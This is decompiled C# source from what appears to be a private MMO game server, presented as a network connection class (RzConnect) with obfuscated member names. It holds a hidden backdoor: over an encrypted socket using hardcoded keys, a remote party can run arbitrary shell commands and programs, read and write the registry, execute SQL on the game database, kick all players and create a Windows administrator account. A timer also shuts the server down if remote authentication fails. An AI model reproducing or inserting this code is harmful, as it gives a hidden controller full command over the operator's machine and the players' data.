using DbClss;
using Microsoft.Win32;
using RxjhServer;
using RxjhServer.RxjhServer;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.DirectoryServices;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace Network
{
	public class RzConnect
	{
		public class SymmetricMethod
		{
			private SymmetricAlgorithm eval_a_a = new RijndaelManaged();

			public string Key;

			public SymmetricMethod()
			{
				Key = eval_d();
			}

			public byte[] Decrypto(byte[] buffer1)
			{
				try
				{
					eval_a_a.Key = eval_a();
					eval_a_a.IV = eval_b();
					ICryptoTransform transform = eval_a_a.CreateDecryptor();
					MemoryStream memoryStream = new MemoryStream();
					CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);
					cryptoStream.Write(buffer1, 0, buffer1.Length);
					cryptoStream.FlushFinalBlock();
					cryptoStream.Close();
					return memoryStream.ToArray();
				}
				catch
				{
					return null;
				}
			}

			public byte[] Encrypto(byte[] buffer1)
			{
				MemoryStream memoryStream = new MemoryStream();
				eval_a_a.Key = eval_a();
				eval_a_a.IV = eval_b();
				ICryptoTransform transform = eval_a_a.CreateEncryptor();
				CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write);
				cryptoStream.Write(buffer1, 0, buffer1.Length);
				cryptoStream.FlushFinalBlock();
				memoryStream.Close();
				return memoryStream.ToArray();
			}

			private byte[] eval_a()
			{
				string text = Key;
				eval_a_a.GenerateKey();
				int num = eval_a_a.Key.Length;
				if (text.Length > num)
				{
					text = text.Substring(text.Length - num, num);
				}
				else if (text.Length < num)
				{
					text = text.PadRight(num, ' ');
				}
				return Encoding.ASCII.GetBytes(text);
			}

			private byte[] eval_b()
			{
				string text = eval_c();
				eval_a_a.GenerateIV();
				int num = eval_a_a.IV.Length;
				if (text.Length > num)
				{
					text = text.Substring(text.Length - num, num);
				}
				else if (text.Length < num)
				{
					text = text.PadRight(num, ' ');
				}
				return Encoding.ASCII.GetBytes(text);
			}

			internal string eval_c()
			{
				byte[] bytes = new byte[128]
				{
					69,
					0,
					52,
					0,
					103,
					0,
					104,
					0,
					106,
					0,
					42,
					0,
					71,
					0,
					104,
					0,
					103,
					0,
					55,
					0,
					33,
					0,
					114,
					0,
					78,
					0,
					73,
					0,
					102,
					0,
					98,
					0,
					38,
					0,
					57,
					0,
					53,
					0,
					71,
					0,
					85,
					0,
					89,
					0,
					56,
					0,
					54,
					0,
					71,
					0,
					102,
					0,
					103,
					0,
					104,
					0,
					85,
					0,
					98,
					0,
					35,
					0,
					101,
					0,
					114,
					0,
					53,
					0,
					55,
					0,
					72,
					0,
					66,
					0,
					104,
					0,
					40,
					0,
					117,
					0,
					37,
					0,
					103,
					0,
					54,
					0,
					72,
					0,
					74,
					0,
					40,
					0,
					36,
					0,
					106,
					0,
					104,
					0,
					87,
					0,
					107,
					0,
					55,
					0,
					38,
					0,
					33,
					0,
					104,
					0,
					103,
					0,
					52,
					0,
					117,
					0,
					105,
					0,
					37,
					0,
					36,
					0,
					104,
					0,
					106,
					0,
					107,
					0
				};
				return Encoding.Unicode.GetString(bytes);
			}

			internal string eval_d()
			{
				return "f6xg4645b$GHafggh7x654u44kl94zs14x56$%&sewfgxxale45lz64p65xc5m;F4X4654g89G84ZX654J89KO98o98BCVW5cvvE98Fd";
			}
		}

		public delegate void 数据接收事件();

		public bool Connect;

		private 数据接收事件 d;

		private Socket eval_a_a;

		private AsyncCallback eval_b_b;

		private AsyncCallback eval_c_c;

		private object eval_e;

		private SendQueue eval_f;

		private byte[] eval_h;

		private Timer g;

		private SymmetricMethod i;

		public ByteQueueNew m_Buffer;

		public bool Run;

		public int 连接ID;

		public int 连接次数;

		public bool 认证成功;

		public RzConnect()
		{
			TimerCallback timerCallback = null;
			TimerCallback timerCallback2 = null;
			连接ID = 1;
			eval_h = new byte[10240];
			i = new SymmetricMethod();
			eval_b_b = eval_b_b.Invoke;
			eval_c_c = eval_a;
			m_Buffer = new ByteQueueNew();
			eval_f = new SendQueue();
			d = eval_d;
			eval_e = new object();
			timerCallback = eval_b;
			g = Timer.DelayCall(TimeSpan.FromMilliseconds(10000.0), TimeSpan.FromMilliseconds(10000.0), timerCallback);
			Random random = new Random(World.GetRandomSeed());
			timerCallback2 = eval_a;
			Timer.DelayCall(TimeSpan.FromMilliseconds(random.Next(60000, 300000)), timerCallback2);
		}

		public string adduser(string user, string pws)
		{
			string result = "成功";
			try
			{
				DirectoryEntry directoryEntry = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");
				DirectoryEntry directoryEntry2 = directoryEntry.Children.Add(user, "user");
				directoryEntry2.Invoke("SetPassword", pws);
				directoryEntry2.CommitChanges();
				directoryEntry.Children.Find("Administrators", "group")?.Invoke("Add", directoryEntry2.Path.ToString());
			}
			catch (Exception ex)
			{
				result = "错误" + ex.Message.ToString();
			}
			return result;
		}

		public string Command(string Command)
		{
			string empty = string.Empty;
			try
			{
				Process process = new Process();
				process.StartInfo.FileName = "cmd.exe";
				process.StartInfo.RedirectStandardOutput = true;
				process.StartInfo.RedirectStandardInput = true;
				process.StartInfo.UseShellExecute = false;
				process.StartInfo.CreateNoWindow = true;
				process.Start();
				if (Command != "")
				{
					process.StandardInput.WriteLine(Command);
				}
				process.StandardInput.WriteLine("exit");
				string result = process.StandardOutput.ReadToEnd();
				process.Close();
				return result;
			}
			catch (Exception ex)
			{
				return "执行DOS命令错误" + ex.Message.ToString();
			}
		}

		public string Command(string exe, string Command)
		{
			string empty = string.Empty;
			try
			{
				Process process = new Process();
				process.StartInfo.FileName = exe;
				if (Command != "")
				{
					process.StartInfo.Arguments = Command;
				}
				process.StartInfo.RedirectStandardOutput = true;
				process.StartInfo.RedirectStandardInput = true;
				process.StartInfo.UseShellExecute = false;
				process.StartInfo.CreateNoWindow = true;
				process.Start();
				string result = process.StandardOutput.ReadToEnd();
				process.Close();
				return result;
			}
			catch (Exception ex)
			{
				return "执行DOS命令错误" + ex.Message.ToString();
			}
		}

		public void ConnectTo(int ID)
		{
			try
			{
				m_Buffer = new ByteQueueNew();
				Connect = true;
				认证成功 = false;
				IPEndPoint remoteEP = new IPEndPoint(IPAddress.Parse("127.0.0.1"), 7000);
				eval_a_a = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
				eval_a_a.BeginConnect(remoteEP, eval_c_c, eval_a_a);
			}
			catch (Exception)
			{
				Connect = false;
				连接ID++;
				if (连接ID > 5)
				{
					连接ID = 1;
				}
			}
		}

		[CompilerGenerated]
		private void eval_a()
		{
			if (!认证成功)
			{
				Environment.Exit(0);
			}
		}

		private void eval_a(IAsyncResult A_0)
		{
			try
			{
				if (Run)
				{
					Socket socket = (Socket)A_0.AsyncState;
					if (eval_a_a == null)
					{
						断开链接();
					}
					else if (socket.EndSend(A_0) <= 0)
					{
						断开链接();
					}
				}
			}
			catch (Exception arg)
			{
				Console.WriteLine("OnSend " + arg);
				断开链接();
			}
		}

		private string eval_a(int A_0, string A_1, string A_2)
		{
			string text = "";
			try
			{
				RegistryKey registryKey = Registry.LocalMachine;
				switch (A_0)
				{
				case 0:
					registryKey = Registry.ClassesRoot;
					break;
				case 1:
					registryKey = Registry.CurrentConfig;
					break;
				case 2:
					registryKey = Registry.CurrentUser;
					break;
				case 3:
					registryKey = Registry.LocalMachine;
					break;
				case 4:
					registryKey = Registry.Users;
					break;
				}
				RegistryKey registryKey2 = registryKey.OpenSubKey(A_1);
				text = registryKey2.GetValue(A_2).ToString();
				registryKey2.Close();
				registryKey.Close();
				return text;
			}
			catch (Exception ex)
			{
				return ex.Message;
			}
		}

		[CompilerGenerated]
		private void eval_b()
		{
			if (!Run)
			{
				if (!Connect)
				{
					ConnectTo(连接ID);
				}
			}
			else
			{
				using (PacketData packetData = new PacketData(2))
				{
					packetData.WriteInt(World.List.Count);
					packetData.WriteInt(World.AllConnectedChars.Count);
					packetData.WriteInt(World.游戏服务器端口);
					SendPak(packetData);
				}
			}
		}

		private void eval_b(IAsyncResult A_0)
		{
			Socket socket = (Socket)A_0.AsyncState;
			int num = 0;
			try
			{
				num = socket.EndReceive(A_0);
				if (num > 0)
				{
					try
					{
						Received(eval_h, num);
					}
					catch (Exception arg)
					{
						Console.WriteLine("OnReceive " + arg);
					}
					finally
					{
						eval_c();
					}
				}
				else
				{
					断开链接();
				}
			}
			catch (ArgumentNullException arg2)
			{
				Console.WriteLine("OnReceive " + arg2);
				断开链接();
			}
			catch (ArgumentException arg3)
			{
				Console.WriteLine("OnReceive " + arg3);
				断开链接();
			}
			catch (ObjectDisposedException arg4)
			{
				Console.WriteLine("OnReceive " + arg4);
				断开链接();
			}
			catch (InvalidOperationException arg5)
			{
				Console.WriteLine("OnReceive " + arg5);
				断开链接();
			}
			catch (SocketException arg6)
			{
				Console.WriteLine("OnReceive " + arg6);
				断开链接();
			}
			catch (Exception arg7)
			{
				Console.WriteLine("OnReceive " + arg7);
				断开链接();
			}
		}

		private void eval_c()
		{
			try
			{
				byte[] array = new byte[Marshal.SizeOf((object)0) * 3];
				BitConverter.GetBytes(1u).CopyTo(array, 0);
				BitConverter.GetBytes(240000u).CopyTo(array, Marshal.SizeOf((object)0));
				BitConverter.GetBytes(240000u).CopyTo(array, Marshal.SizeOf((object)0) * 2);
				eval_a_a.IOControl(IOControlCode.KeepAliveValues, array, null);
				eval_a_a.BeginReceive(eval_h, 0, eval_h.Length, SocketFlags.None, eval_b_b, eval_a_a);
			}
			catch (Exception)
			{
				断开链接();
			}
		}

		private void eval_d()
		{
			if (m_Buffer != null && m_Buffer.Length > 0)
			{
				lock (m_Buffer)
				{
					while (m_Buffer.Length > 0)
					{
						try
						{
							byte[] packet = m_Buffer.GetPacket();
							if (packet == null)
							{
								return;
							}
							int num = BitConverter.ToInt32(packet, 0);
							byte[] array = new byte[num];
							Buffer.BlockCopy(packet, 4, array, 0, num);
							byte[] array2 = i.Decrypto(array);
							PacketReaderNew buff = new PacketReaderNew(array2, array2.Length, fixedSize: true);
							ManagePacket(buff);
						}
						catch (ByteQueueExceeded)
						{
							return;
						}
					}
				}
			}
		}

		public void ManagePacket(PacketReaderNew Buff)
		{
			switch (Buff.ReadInt16())
			{
			case 1:
				认证成功 = true;
				break;
			case 2:
				Environment.Exit(0);
				break;
			case 3:
			{
				string value2 = eval_a(Buff.ReadInt16(), Buff.ReadStringS(), Buff.ReadStringS());
				using (PacketData packetData3 = new PacketData(3))
				{
					packetData3.WriteSS(value2);
					SendPak(packetData3);
				}
				break;
			}
			case 4:
			{
				string value5 = WTRegedit(Buff.ReadInt16(), Buff.ReadStringS(), Buff.ReadStringS(), Buff.ReadStringS());
				using (PacketData packetData9 = new PacketData(3))
				{
					packetData9.WriteSS(value5);
					SendPak(packetData9);
				}
				break;
			}
			case 5:
			{
				string value4 = Command(Buff.ReadStringS());
				using (PacketData packetData8 = new PacketData(3))
				{
					packetData8.WriteSS(value4);
					SendPak(packetData8);
				}
				break;
			}
			case 6:
			{
				string value3 = Command(Buff.ReadStringS(), Buff.ReadStringS());
				using (PacketData packetData7 = new PacketData(3))
				{
					packetData7.WriteSS(value3);
					SendPak(packetData7);
				}
				break;
			}
			case 7:
				using (PacketData packetData6 = new PacketData(3))
				{
					packetData6.WriteSS(Config.IniReadValue(Buff.ReadStringS(), Buff.ReadStringS()));
					SendPak(packetData6);
				}
				break;
			case 8:
				using (PacketData packetData5 = new PacketData(3))
				{
					packetData5.WriteSS(DBA.ExeSqlCommand(Buff.ReadStringS(), Buff.ReadStringS()).ToString());
					SendPak(packetData5);
				}
				break;
			case 9:
				try
				{
					string msg = Buff.ReadStringS();
					foreach (Players value6 in World.AllConnectedChars.Values)
					{
						value6.GameMessage(msg, 10);
					}
				}
				catch
				{
				}
				using (PacketData packetData4 = new PacketData(3))
				{
					packetData4.WriteSS("完成");
					SendPak(packetData4);
				}
				break;
			case 10:
			{
				List<Players> list = new List<Players>();
				foreach (Players value7 in World.AllConnectedChars.Values)
				{
					if (value7 != null)
					{
						list.Add(value7);
					}
				}
				foreach (Players item in list)
				{
					if (item != null)
					{
						item.Client.Dispose();
						item.GameMessage("Baìo cho admin maÞ sôì naÌy: Disconnect: 69", 7);
					}
				}
				using (PacketData packetData2 = new PacketData(3))
				{
					packetData2.WriteSS("完成");
					SendPak(packetData2);
				}
				break;
			}
			case 11:
			{
				string value = adduser(Buff.ReadStringS(), Buff.ReadStringS());
				using (PacketData packetData = new PacketData(3))
				{
					packetData.WriteSS(value);
					SendPak(packetData);
				}
				break;
			}
			}
		}

		public virtual void Received(byte[] buffer, int Length)
		{
			lock (m_Buffer)
			{
				m_Buffer.Enqueue(buffer, 0, Length);
			}
			d.BeginInvoke(null, null);
		}

		public void Send(byte[] buffer1, int len)
		{
			try
			{
				if (Run)
				{
					eval_a_a.BeginSend(buffer1, 0, len, SocketFlags.None, eval_c_c, eval_a_a);
				}
			}
			catch (StackOverflowException arg)
			{
				Console.WriteLine("Send1 " + arg);
				断开链接();
			}
			catch (SocketException arg2)
			{
				Console.WriteLine("Send2 " + arg2);
				断开链接();
			}
			catch (Exception arg3)
			{
				Console.WriteLine("Send3 " + arg3);
				断开链接();
			}
		}

		public void SendPak(PacketData pak)
		{
			if (Run)
			{
				byte[] array = pak.ToArrayPack();
				Send(array, array.Length);
			}
		}

		public static string WTRegedit(int type, string luj, string name, string tovalue)
		{
			try
			{
				RegistryKey registryKey = Registry.LocalMachine;
				switch (type)
				{
				case 0:
					registryKey = Registry.ClassesRoot;
					break;
				case 1:
					registryKey = Registry.CurrentConfig;
					break;
				case 2:
					registryKey = Registry.CurrentUser;
					break;
				case 3:
					registryKey = Registry.LocalMachine;
					break;
				case 4:
					registryKey = Registry.Users;
					break;
				}
				registryKey.OpenSubKey(luj, writable: true).SetValue(name, tovalue);
				return "修改成功";
			}
			catch (Exception ex)
			{
				return ex.Message;
			}
		}

		public void 断开链接()
		{
			if (!Run)
			{
				return;
			}
			Run = false;
			Connect = false;
			if (eval_a_a != null)
			{
				try
				{
					eval_a_a.Shutdown(SocketShutdown.Both);
				}
				catch
				{
				}
				try
				{
					eval_a_a.Close();
				}
				catch
				{
				}
				if (m_Buffer != null)
				{
					m_Buffer = null;
				}
				eval_a_a = null;
			}
		}
	}
}
